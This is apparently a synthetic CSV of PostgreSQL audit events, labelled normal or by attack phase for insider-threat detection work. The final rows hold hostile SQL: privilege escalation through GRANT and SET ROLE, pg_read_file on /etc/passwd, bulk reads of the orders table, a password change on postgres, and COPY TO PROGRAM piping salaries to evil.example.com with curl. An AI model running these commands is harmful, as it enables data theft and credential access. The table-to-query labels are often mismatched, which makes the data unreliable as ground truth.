event_id,timestamp,db_user,sql_statement,tables_involved,status,rows_affected,graph_frame,is_after_hours,scenario_type,attack_phase
EVT_0047291,2025-06-19 17:23:56,normal_user_18,"SELECT COUNT(*), MAX(na_key) FROM public.nation WHERE na_key > 0;",nation,SUCCESS,78,G3,0,Daily-Report,normal
EVT_0047292,2025-06-19 14:37:01,normal_user_18,SELECT * FROM public.customer WHERE cu_key < 3693;,customer,SUCCESS,70,G3,0,Daily-Report,normal
EVT_0047293,2025-06-19 15:39:29,normal_user_18,SELECT * FROM public.orders WHERE or_key > 166;,orders,SUCCESS,54,G3,0,Normal,normal
EVT_0047294,2025-06-19 17:07:55,normal_user_18,"SELECT pa_key, pa_comment FROM public.part WHERE pa_key BETWEEN 79 AND 351;",part,SUCCESS,54,G3,0,Normal,normal
EVT_0047295,2025-06-19 16:58:48,normal_user_18,SELECT * FROM public.supplier WHERE su_key = 1294;,supplier,SUCCESS,30,G3,0,Daily-Report,normal
EVT_0047296,2025-06-19 14:12:55,normal_user_18,SELECT * FROM public.nation ORDER BY 1 LIMIT 35;,nation,SUCCESS,23,G3,0,Normal_Admin,normal
EVT_0047297,2025-06-19 15:19:57,normal_user_18,SELECT * FROM public.supplier WHERE su_key < 4687;,supplier,SUCCESS,66,G3,0,Normal,normal
EVT_0047298,2025-06-19 16:22:49,normal_user_18,"SELECT su_key, su_comment FROM public.supplier ORDER BY su_key DESC LIMIT 32;",supplier,SUCCESS,54,G3,0,Normal_Admin,normal
EVT_0047299,2025-06-19 16:09:47,normal_user_19,SELECT * FROM public.part WHERE pa_key BETWEEN 14 AND 96;,part,SUCCESS,45,G3,0,Normal_Admin_Maintenance,normal
EVT_0047300,2025-06-19 16:29:44,normal_user_19,SELECT * FROM public.region WHERE re_key > 675;,region,SUCCESS,47,G3,0,Normal_Admin,normal
EVT_0047301,2025-06-19 15:00:12,normal_user_19,SELECT * FROM public.lineitem WHERE li_key % 2 = 0 LIMIT 21;,lineitem,SUCCESS,37,G3,0,Normal,normal
EVT_0047302,2025-06-19 14:42:01,normal_user_19,SELECT * FROM public.customer WHERE cu_key > 323;,customer,SUCCESS,19,G3,0,Daily-Report,normal
EVT_0047303,2025-06-19 17:20:33,normal_user_19,SELECT * FROM public.nation WHERE na_key = 3899;,nation,SUCCESS,57,G3,0,Normal_Admin,normal
EVT_0047304,2025-06-19 15:28:56,normal_user_19,"SELECT re_key, re_comment FROM public.region WHERE re_key BETWEEN 24 AND 345;",region,SUCCESS,7,G3,0,Daily-Report,normal
EVT_0047305,2025-06-19 14:38:27,normal_user_19,SELECT * FROM public.lineitem WHERE li_key % 2 = 0 LIMIT 18;,lineitem,SUCCESS,49,G3,0,Normal_Admin_Maintenance,normal
EVT_0047306,2025-06-19 15:49:54,normal_user_19,SELECT COUNT(*) FROM public.region;,region,SUCCESS,59,G3,0,Daily-Report,normal
EVT_0047307,2025-06-19 16:27:36,normal_user_19,"SELECT c.c_name, o.o_totalprice FROM public.customer c JOIN public.orders o ON c.c_custkey = o.o_custkey LIMIT 25;",customer,SUCCESS,56,G3,0,Normal_Admin,normal
EVT_0047308,2025-06-19 16:32:02,normal_user_19,SELECT * FROM public.customer WHERE cu_key % 2 = 0 LIMIT 45;,customer,SUCCESS,6,G3,0,Normal,normal
EVT_0047309,2025-06-19 15:11:51,normal_user_19,"SELECT COUNT(*), MAX(na_key) FROM public.nation WHERE na_key > 0;",nation,SUCCESS,5,G3,0,Normal_Admin,normal
EVT_0047310,2025-06-19 15:29:36,normal_user_19,SELECT * FROM public.customer WHERE cu_key % 2 = 0 LIMIT 31;,customer,SUCCESS,50,G3,0,Normal_Admin,normal
EVT_0047311,2025-06-19 14:56:47,normal_user_19,"SELECT COUNT(*), MAX(pa_key) FROM public.part WHERE pa_key > 0;",part,SUCCESS,44,G3,0,Normal,normal
EVT_0047312,2025-06-19 16:21:59,normal_user_19,SELECT * FROM public.part WHERE pa_key % 2 = 0 LIMIT 13;,part,SUCCESS,23,G3,0,Normal_Admin_Maintenance,normal
EVT_0047313,2025-06-19 17:29:58,normal_user_19,"SELECT p.p_name, ps.ps_supplycost FROM public.part p JOIN public.partsupp ps ON p.p_partkey = ps.ps_partkey LIMIT 28;",lineitem,SUCCESS,67,G3,0,Normal,normal
EVT_0047314,2025-06-19 17:46:22,normal_user_19,SELECT * FROM public.nation ORDER BY 1 LIMIT 29;,nation,SUCCESS,45,G3,0,Normal,normal
EVT_0047315,2025-06-19 14:21:55,dev_user_1,INSERT INTO public.customer SELECT * FROM public.customer WHERE cu_key = 28;,customer,SUCCESS,81,G3,0,Normal_Admin,normal
EVT_0047316,2025-06-19 14:58:19,dev_user_1,SELECT COUNT(*) FROM public.partsupp WHERE 1=1;,partsupp,SUCCESS,88,G3,0,Normal,normal
EVT_0047317,2025-06-19 15:37:21,dev_user_1,SELECT pg_size_pretty(pg_total_relation_size('public.customer')) AS table_size;,customer,SUCCESS,56,G3,0,Daily-Report,normal
EVT_0047318,2025-06-19 15:06:06,dev_user_1,UPDATE public.customer SET cu_comment = 'updated_3' WHERE cu_key = 479;,customer,SUCCESS,105,G3,0,Normal_Admin_Maintenance,normal
EVT_0047319,2025-06-19 14:59:49,dev_user_1,"SELECT column_name, data_type FROM information_schema.columns WHERE table_name='partsupp';",partsupp,SUCCESS,118,G3,0,Normal_Admin_Maintenance,normal
EVT_0047320,2025-06-19 15:16:34,dev_user_1,"SELECT indexname, indexdef FROM pg_indexes WHERE tablename = 'nation';",nation,SUCCESS,23,G3,0,Normal_Admin,normal
EVT_0047321,2025-06-19 14:54:41,dev_user_1,SELECT pa_key FROM public.partsupp WHERE pa_key NOT IN (SELECT pa_key FROM public.partsupp WHERE pa_key < 105) LIMIT 30;,partsupp,SUCCESS,77,G3,0,Daily-Report,normal
EVT_0047322,2025-06-19 15:43:48,dev_user_1,SELECT pg_size_pretty(pg_total_relation_size('public.customer')) AS table_size;,customer,SUCCESS,96,G3,0,Normal,normal
EVT_0047323,2025-06-19 17:47:49,dev_user_1,SELECT * FROM public.region ORDER BY random() LIMIT 21;,region,SUCCESS,71,G3,0,Normal,normal
EVT_0047324,2025-06-19 14:50:30,dev_user_1,INSERT INTO public.lineitem SELECT * FROM public.lineitem WHERE li_key = 72;,lineitem,SUCCESS,116,G3,0,Normal_Admin_Maintenance,normal
EVT_0047325,2025-06-19 14:33:07,dev_user_1,SELECT pg_size_pretty(pg_total_relation_size('public.supplier')) AS table_size;,supplier,SUCCESS,21,G3,0,Normal_Admin_Maintenance,normal
EVT_0047326,2025-06-19 14:33:03,dev_user_1,"SELECT o.o_orderkey, l.l_quantity, l.l_shipdate FROM public.orders o JOIN public.lineitem l ON o.o_orderkey = l.l_orderkey WHERE o.o_totalprice > 3109 LIMIT 30;",region,SUCCESS,104,G3,0,Normal_Admin_Maintenance,normal
EVT_0047327,2025-06-19 15:35:26,dev_user_1,SELECT re_key FROM public.region WHERE re_key NOT IN (SELECT re_key FROM public.region WHERE re_key < 331) LIMIT 30;,region,SUCCESS,103,G3,0,Normal_Admin,normal
EVT_0047328,2025-06-19 15:30:40,dev_user_1,UPDATE public.part SET pa_comment = 'updated_13' WHERE pa_key = 177;,part,SUCCESS,59,G3,0,Normal,normal
EVT_0047329,2025-06-19 17:41:10,dev_user_1,"SELECT indexname, indexdef FROM pg_indexes WHERE tablename = 'lineitem';",lineitem,SUCCESS,51,G3,0,Normal_Admin_Maintenance,normal
EVT_0047330,2025-06-19 14:31:22,dev_user_1,"SELECT s.s_name, ps.ps_supplycost FROM public.supplier s JOIN public.partsupp ps ON s.s_suppkey = ps.ps_suppkey ORDER BY ps.ps_supplycost DESC LIMIT 20;",customer,SUCCESS,107,G3,0,Daily-Report,normal
EVT_0047331,2025-06-19 16:22:20,dev_user_2,SELECT * FROM public.orders WHERE or_key BETWEEN 157 AND 324;,orders,SUCCESS,31,G3,0,Daily-Report,normal
EVT_0047332,2025-06-19 17:33:53,dev_user_2,SELECT * FROM public.orders WHERE or_key = 49;,orders,SUCCESS,42,G3,0,Normal_Admin,normal
EVT_0047333,2025-06-19 17:00:56,dev_user_2,SELECT * FROM public.customer LIMIT 26;,customer,SUCCESS,47,G3,0,Normal_Admin,normal
EVT_0047334,2025-06-19 14:02:14,dev_user_2,"SELECT indexname, indexdef FROM pg_indexes WHERE tablename = 'customer';",customer,SUCCESS,37,G3,0,Daily-Report,normal
EVT_0047335,2025-06-19 14:11:47,dev_user_2,SELECT pg_size_pretty(pg_total_relation_size('public.customer')) AS table_size;,customer,SUCCESS,16,G3,0,Normal,normal
EVT_0047336,2025-06-19 16:51:51,dev_user_2,"SELECT indexname, indexdef FROM pg_indexes WHERE tablename = 'nation';",nation,SUCCESS,29,G3,0,Normal,normal
EVT_0047337,2025-06-19 14:20:30,dev_user_2,"SELECT o.o_orderkey, l.l_quantity, l.l_shipdate FROM public.orders o JOIN public.lineitem l ON o.o_orderkey = l.l_orderkey WHERE o.o_totalprice > 5714 LIMIT 30;",region,SUCCESS,96,G3,0,Daily-Report,normal
EVT_0047338,2025-06-19 14:54:53,dev_user_2,"SELECT o.o_orderkey, l.l_quantity, l.l_shipdate FROM public.orders o JOIN public.lineitem l ON o.o_orderkey = l.l_orderkey WHERE o.o_totalprice > 8091 LIMIT 30;",lineitem,SUCCESS,111,G3,0,Daily-Report,normal
EVT_0047339,2025-06-19 16:47:03,dev_user_2,"SELECT column_name, data_type FROM information_schema.columns WHERE table_name='nation';",nation,SUCCESS,39,G3,0,Normal,normal
EVT_0047340,2025-06-19 15:07:42,dev_user_2,"SELECT s.s_name, ps.ps_supplycost FROM public.supplier s JOIN public.partsupp ps ON s.s_suppkey = ps.ps_suppkey ORDER BY ps.ps_supplycost DESC LIMIT 20;",orders,SUCCESS,42,G3,0,Daily-Report,normal
EVT_0047341,2025-06-19 14:15:39,dev_user_2,SELECT pg_size_pretty(pg_total_relation_size('public.partsupp')) AS table_size;,partsupp,SUCCESS,91,G3,0,Normal_Admin_Maintenance,normal
EVT_0047342,2025-06-19 17:58:14,dev_user_2,INSERT INTO public.part SELECT * FROM public.part WHERE pa_key = 7;,part,SUCCESS,29,G3,0,Normal,normal
EVT_0047343,2025-06-19 16:15:45,dev_user_2,SELECT or_key FROM public.orders WHERE or_key NOT IN (SELECT or_key FROM public.orders WHERE or_key < 246) LIMIT 30;,orders,SUCCESS,41,G3,0,Normal,normal
EVT_0047344,2025-06-19 15:55:22,dev_user_2,SELECT COUNT(*) FROM public.supplier WHERE 1=1;,supplier,SUCCESS,41,G3,0,Normal_Admin,normal
EVT_0047345,2025-06-19 17:47:19,dev_user_2,UPDATE public.region SET re_comment = 'updated_14' WHERE re_key = 368;,region,SUCCESS,80,G3,0,Normal_Admin,normal
EVT_0047346,2025-06-19 17:46:14,dev_user_2,INSERT INTO public.orders SELECT * FROM public.orders WHERE or_key = 35;,orders,SUCCESS,34,G3,0,Normal_Admin,normal
EVT_0047347,2025-06-19 14:36:39,dev_user_3,SELECT * FROM public.customer LIMIT 78;,customer,SUCCESS,101,G3,0,Normal,normal
EVT_0047348,2025-06-19 15:37:50,dev_user_3,"SELECT column_name, data_type FROM information_schema.columns WHERE table_name='region';",region,SUCCESS,63,G3,0,Normal_Admin,normal
EVT_0047349,2025-06-19 14:04:07,dev_user_3,SELECT pg_size_pretty(pg_total_relation_size('public.region')) AS table_size;,region,SUCCESS,117,G3,0,Normal,normal
EVT_0047350,2025-06-19 15:48:54,dev_user_3,SELECT * FROM public.part WHERE pa_key = 408;,part,SUCCESS,38,G3,0,Normal,normal
EVT_0047351,2025-06-19 14:31:33,dev_user_3,SELECT * FROM public.lineitem WHERE li_key BETWEEN 98 AND 308;,lineitem,SUCCESS,56,G3,0,Normal,normal
EVT_0047352,2025-06-19 14:06:14,dev_user_3,"SELECT s.s_name, ps.ps_supplycost FROM public.supplier s JOIN public.partsupp ps ON s.s_suppkey = ps.ps_suppkey ORDER BY ps.ps_supplycost DESC LIMIT 20;",nation,SUCCESS,38,G3,0,Normal,normal
EVT_0047353,2025-06-19 16:24:18,dev_user_3,INSERT INTO public.customer SELECT * FROM public.customer WHERE cu_key = 4;,customer,SUCCESS,76,G3,0,Normal_Admin,normal
EVT_0047354,2025-06-19 17:25:34,dev_user_3,SELECT pg_size_pretty(pg_total_relation_size('public.supplier')) AS table_size;,supplier,SUCCESS,59,G3,0,Daily-Report,normal
EVT_0047355,2025-06-19 15:52:13,dev_user_3,EXPLAIN ANALYZE SELECT * FROM public.supplier LIMIT 50;,supplier,SUCCESS,74,G3,0,Normal_Admin,normal
EVT_0047356,2025-06-19 15:52:46,dev_user_3,EXPLAIN ANALYZE SELECT * FROM public.partsupp LIMIT 50;,partsupp,SUCCESS,105,G3,0,Normal_Admin_Maintenance,normal
EVT_0047357,2025-06-19 17:32:43,dev_user_3,SELECT COUNT(*) FROM public.customer WHERE 1=1;,customer,SUCCESS,30,G3,0,Normal_Admin,normal
EVT_0047358,2025-06-19 17:53:02,dev_user_3,SELECT pg_size_pretty(pg_total_relation_size('public.customer')) AS table_size;,customer,SUCCESS,70,G3,0,Normal_Admin,normal
EVT_0047359,2025-06-19 16:18:44,dev_user_3,SELECT pg_size_pretty(pg_total_relation_size('public.supplier')) AS table_size;,supplier,SUCCESS,84,G3,0,Normal,normal
EVT_0047360,2025-06-19 16:06:03,dev_user_3,EXPLAIN ANALYZE SELECT * FROM public.customer LIMIT 50;,customer,SUCCESS,47,G3,0,Daily-Report,normal
EVT_0047361,2025-06-19 16:02:20,dev_user_3,EXPLAIN ANALYZE SELECT * FROM public.part LIMIT 50;,part,SUCCESS,14,G3,0,Normal,normal
EVT_0047362,2025-06-19 15:34:02,dev_user_3,UPDATE public.part SET pa_comment = 'updated_15' WHERE pa_key = 61;,part,SUCCESS,73,G3,0,Normal_Admin,normal
EVT_0047363,2025-06-19 17:25:21,hr_specialist_1,SELECT * FROM public.salary_details WHERE salary BETWEEN 32484 AND 296105;,supplier,SUCCESS,58,G3,0,Normal_Admin,normal
EVT_0047364,2025-06-19 17:08:07,hr_specialist_1,SELECT * FROM public.salary_details WHERE salary BETWEEN 47115 AND 270412;,nation,SUCCESS,48,G3,0,Normal_Admin,normal
EVT_0047365,2025-06-19 17:22:54,hr_specialist_1,UPDATE public.salary_details SET salary = salary * 1.05 WHERE department = 'HR' AND db_user = 'hr_specialist_1';,partsupp,SUCCESS,49,G3,0,Normal_Admin_Maintenance,normal
EVT_0047366,2025-06-19 14:11:04,hr_specialist_1,"SELECT sd.db_user, sd.salary, c.c_name FROM public.salary_details sd JOIN public.customer c ON sd.db_user = c.c_name LIMIT 20;",customer,SUCCESS,55,G3,0,Daily-Report,normal
EVT_0047367,2025-06-19 17:55:30,hr_specialist_1,SELECT * FROM public.customer WHERE salary % 2 = 0 LIMIT 13;,customer,SUCCESS,30,G3,0,Normal,normal
EVT_0047368,2025-06-19 16:52:34,hr_specialist_1,UPDATE public.salary_details SET salary = salary * 1.05 WHERE department = 'HR' AND db_user = 'hr_specialist_1';,region,SUCCESS,46,G3,0,Daily-Report,normal
EVT_0047369,2025-06-19 17:04:31,hr_specialist_1,SELECT * FROM public.orders LIMIT 76;,orders,SUCCESS,40,G3,0,Normal_Admin_Maintenance,normal
EVT_0047370,2025-06-19 14:46:53,hr_specialist_1,SELECT * FROM public.customer ORDER BY 1 DESC LIMIT 20;,customer,SUCCESS,64,G3,0,Normal_Admin,normal
EVT_0047371,2025-06-19 14:42:53,hr_specialist_1,SELECT * FROM public.part WHERE salary % 2 = 0 LIMIT 10;,part,SUCCESS,82,G3,0,Normal_Admin,normal
EVT_0047372,2025-06-19 16:53:37,hr_specialist_1,SELECT * FROM public.salary_details WHERE salary BETWEEN 35009 AND 127175;,salary_details,SUCCESS,70,G3,0,Normal_Admin,normal
EVT_0047373,2025-06-19 16:44:08,hr_specialist_1,SELECT * FROM public.salary_details WHERE department = 'Finance' LIMIT 30;,part,SUCCESS,69,G3,0,Normal_Admin,normal
EVT_0047374,2025-06-19 16:40:12,hr_specialist_1,"SELECT department, COUNT(*) as headcount, AVG(salary) FROM public.salary_details GROUP BY department;",supplier,SUCCESS,86,G3,0,Normal_Admin_Maintenance,normal
EVT_0047375,2025-06-19 16:07:12,hr_specialist_1,SELECT * FROM public.partsupp ORDER BY 1 DESC LIMIT 20;,partsupp,SUCCESS,24,G3,0,Daily-Report,normal
EVT_0047376,2025-06-19 14:24:39,hr_specialist_1,SELECT * FROM public.customer WHERE salary % 2 = 0 LIMIT 14;,customer,SUCCESS,65,G3,0,Daily-Report,normal
EVT_0047377,2025-06-19 16:41:33,hr_specialist_1,"INSERT INTO public.salary_details (db_user, department, salary) VALUES ('new_emp_14', 'HR', 70191);",lineitem,SUCCESS,36,G3,0,Normal,normal
EVT_0047378,2025-06-19 16:32:24,hr_specialist_1,SELECT * FROM public.region LIMIT 54;,region,SUCCESS,17,G3,0,Normal_Admin_Maintenance,normal
EVT_0047379,2025-06-19 16:50:15,hr_specialist_2,"SELECT department, COUNT(*) as headcount, AVG(salary) FROM public.salary_details GROUP BY department;",partsupp,SUCCESS,16,G3,0,Normal,normal
EVT_0047380,2025-06-19 14:39:38,hr_specialist_2,SELECT * FROM public.supplier WHERE salary % 2 = 0 LIMIT 9;,supplier,SUCCESS,93,G3,0,Normal_Admin,normal
EVT_0047381,2025-06-19 14:57:09,hr_specialist_2,"SELECT AVG(salary), MAX(salary), MIN(salary) FROM public.salary_details;",part,SUCCESS,26,G3,0,Normal_Admin_Maintenance,normal
EVT_0047382,2025-06-19 14:40:07,hr_specialist_2,"INSERT INTO public.salary_details (db_user, department, salary) VALUES ('new_emp_3', 'HR', 87553);",customer,SUCCESS,10,G3,0,Normal_Admin,normal
EVT_0047383,2025-06-19 15:18:44,hr_specialist_2,SELECT * FROM public.salary_details WHERE salary BETWEEN 61057 AND 127064;,partsupp,SUCCESS,65,G3,0,Normal_Admin,normal
EVT_0047384,2025-06-19 16:37:49,hr_specialist_2,SELECT * FROM public.salary_details WHERE department = 'Finance' LIMIT 30;,salary_details,SUCCESS,26,G3,0,Normal_Admin_Maintenance,normal
EVT_0047385,2025-06-19 16:37:26,hr_specialist_2,SELECT * FROM public.salary_details WHERE salary BETWEEN 77138 AND 249444;,supplier,SUCCESS,21,G3,0,Normal,normal
EVT_0047386,2025-06-19 17:36:10,hr_specialist_2,SELECT * FROM public.salary_details LIMIT 18;,salary_details,SUCCESS,95,G3,0,Normal_Admin_Maintenance,normal
EVT_0047387,2025-06-19 16:24:45,hr_specialist_2,SELECT * FROM public.salary_details WHERE salary BETWEEN 50086 AND 163289;,supplier,SUCCESS,18,G3,0,Daily-Report,normal
EVT_0047388,2025-06-19 16:05:05,hr_specialist_2,"SELECT AVG(salary), MAX(salary), MIN(salary) FROM public.salary_details;",region,SUCCESS,30,G3,0,Normal_Admin,normal
EVT_0047389,2025-06-19 17:39:35,hr_specialist_2,UPDATE public.salary_details SET salary = salary * 1.05 WHERE department = 'HR' AND db_user = 'hr_specialist_2';,lineitem,SUCCESS,15,G3,0,Normal_Admin,normal
EVT_0047390,2025-06-19 14:42:54,hr_specialist_2,SELECT * FROM public.customer ORDER BY 1 DESC LIMIT 20;,customer,SUCCESS,67,G3,0,Daily-Report,normal
EVT_0047391,2025-06-19 14:31:46,hr_specialist_2,"SELECT department, MAX(salary) FROM public.salary_details GROUP BY department;",partsupp,SUCCESS,18,G3,0,Normal,normal
EVT_0047392,2025-06-19 15:42:23,hr_specialist_2,"SELECT db_user, salary FROM public.salary_details WHERE salary > 89936 LIMIT 20;",customer,SUCCESS,22,G3,0,Normal,normal
EVT_0047393,2025-06-19 15:03:11,hr_specialist_2,"SELECT AVG(salary), MAX(salary), MIN(salary) FROM public.salary_details;",customer,SUCCESS,34,G3,0,Daily-Report,normal
EVT_0047394,2025-06-19 16:59:34,hr_specialist_2,SELECT * FROM public.nation ORDER BY random() LIMIT 23;,nation,SUCCESS,66,G3,0,Normal,normal
EVT_0047395,2025-06-19 15:12:48,postgres,SHOW work_mem;,system_catalog,SUCCESS,14,G3,0,Normal_Admin,normal
EVT_0047396,2025-06-19 15:57:16,postgres,"SELECT relname, pg_size_pretty(pg_total_relation_size(relid)) AS size FROM pg_statio_user_tables ORDER BY pg_total_relation_size(relid) DESC LIMIT 10;",system_catalog,SUCCESS,15,G3,0,Normal_Admin,normal
EVT_0047397,2025-06-19 17:09:32,postgres,SHOW work_mem;,system_catalog,SUCCESS,1,G3,0,Normal_Admin,normal
EVT_0047398,2025-06-19 16:14:21,postgres,"SELECT indexrelname, idx_scan, idx_tup_read FROM pg_stat_user_indexes ORDER BY idx_scan DESC LIMIT 10;",system_catalog,SUCCESS,3,G3,0,Normal_Admin,normal
EVT_0047399,2025-06-19 16:16:45,normal_user_1,SELECT * FROM public.salary_details WHERE salary > 50000000;,salary_details,PERMISSION DENIED,0,G3,0,Privilege_Escalation,preparation
EVT_0047400,2025-06-19 15:19:36,normal_user_1,GRANT SELECT ON TABLE public.salary_details TO normal_user_1;,salary_details,PERMISSION DENIED,0,G3,0,Privilege_Escalation,preparation
EVT_0047401,2025-06-19 15:45:44,normal_user_1,GRANT ALL PRIVILEGES ON TABLE public.salary_details TO normal_user_1;,salary_details,SUCCESS,0,G3,0,Privilege_Escalation,preparation
EVT_0047402,2025-06-19 15:58:58,normal_user_1,SELECT * FROM public.salary_details WHERE salary > 50000000;,salary_details,PERMISSION DENIED,0,G3,0,Privilege_Escalation,preparation
EVT_0047403,2025-06-19 15:27:14,normal_user_1,GRANT SELECT ON TABLE public.salary_details TO normal_user_1;,salary_details,PERMISSION DENIED,0,G3,0,Privilege_Escalation,preparation
EVT_0047404,2025-06-19 16:19:58,normal_user_1,GRANT ALL PRIVILEGES ON TABLE public.salary_details TO normal_user_1;,salary_details,SUCCESS,0,G3,0,Privilege_Escalation,preparation
EVT_0047405,2025-06-19 15:01:59,normal_user_9,SET ROLE postgres; SELECT * FROM public.orders LIMIT 500;,system_catalog,SUCCESS,129,G3,0,Credential_Abuse,preparation
EVT_0047406,2025-06-19 16:03:19,normal_user_9,SET SESSION AUTHORIZATION postgres; SELECT * FROM public.salary_details;,system_catalog,PERMISSION DENIED,68,G3,0,Credential_Abuse,preparation
EVT_0047407,2025-06-19 14:54:50,normal_user_9,SELECT pg_read_file('/etc/passwd');,system_catalog,SUCCESS,138,G3,0,Credential_Abuse,preparation
EVT_0047408,2025-06-19 15:12:33,normal_user_9,SELECT lo_get(lo_creat(-1));,system_catalog,SUCCESS,197,G3,0,Credential_Abuse,preparation
EVT_0047409,2025-06-19 17:05:57,normal_user_9,SET ROLE postgres; SELECT * FROM public.orders LIMIT 500;,system_catalog,PERMISSION DENIED,104,G3,0,Credential_Abuse,preparation
EVT_0047410,2025-06-19 16:48:19,dev_user_1,SELECT * FROM public.orders LIMIT 3000 OFFSET 0;,orders,SUCCESS,1792,G3,0,Slow_Rate_Exfiltration,preparation
EVT_0047411,2025-06-19 14:29:14,dev_user_1,SELECT * FROM public.orders WHERE or_key > 0 LIMIT 2000;,orders,SUCCESS,1091,G3,0,Slow_Rate_Exfiltration,preparation
EVT_0047412,2025-06-19 17:07:10,dev_user_1,SELECT * FROM public.orders LIMIT 3000 OFFSET 0;,orders,SUCCESS,2445,G3,0,Slow_Rate_Exfiltration,preparation
EVT_0047413,2025-06-19 15:58:29,dev_user_1,SELECT * FROM public.orders WHERE or_key > 0 LIMIT 2000;,orders,SUCCESS,1923,G3,0,Slow_Rate_Exfiltration,preparation
EVT_0047414,2025-06-19 14:51:13,dev_user_1,SELECT * FROM public.orders LIMIT 3000 OFFSET 0;,orders,SUCCESS,2939,G3,0,Slow_Rate_Exfiltration,preparation
EVT_0047415,2025-06-19 16:34:47,dev_user_1,SELECT * FROM public.orders WHERE or_key > 0 LIMIT 2000;,orders,SUCCESS,2437,G3,0,Slow_Rate_Exfiltration,preparation
EVT_0047416,2025-06-19 18:47:19,dev_user_2,ALTER USER postgres PASSWORD 'hacked123!';,salary_details,PERMISSION DENIED,0,G4,1,Credential_Abuse,execution
EVT_0047417,2025-06-19 18:36:07,dev_user_2,COPY public.salary_details TO PROGRAM 'curl -d @- https://evil.example.com';,salary_details,PERMISSION DENIED,0,G4,1,Credential_Abuse,execution
EVT_0047418,2025-06-19 19:57:39,dev_user_2,SET ROLE postgres; COPY public.orders TO '/tmp/full_orders.csv' CSV HEADER;,salary_details,PERMISSION DENIED,0,G4,1,Credential_Abuse,execution
EVT_0047419,2025-06-19 19:24:36,dev_user_2,SELECT * FROM public.salary_details JOIN public.customer ON TRUE LIMIT 200;,salary_details,PERMISSION DENIED,0,G4,1,Credential_Abuse,execution
